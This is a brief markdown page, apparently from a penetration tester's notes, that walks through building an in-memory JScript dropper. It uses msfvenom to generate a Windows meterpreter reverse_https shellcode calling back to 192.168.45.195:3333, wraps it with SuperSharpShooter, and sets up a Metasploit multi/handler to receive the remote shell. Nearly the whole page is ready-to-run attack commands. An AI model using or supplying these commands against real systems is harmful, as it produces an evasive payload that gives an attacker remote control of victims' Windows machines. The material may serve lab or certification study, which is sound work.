---
title: SuperSharpShooter JScript (In Memory)
layout: default
parent: Shellcode
nav_order: 4
---

1. First prepare a shell.txt using msfvenom:
`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.195 LPORT=3333 -f raw -o /home/kali/shell.txt`

2. Then use SuperSharpShooter:
`python3 SuperSharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /home/kali/shell.txt --output test`

3. To receive the incoming shell:

```
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost IP
set lport PORT
exploit
```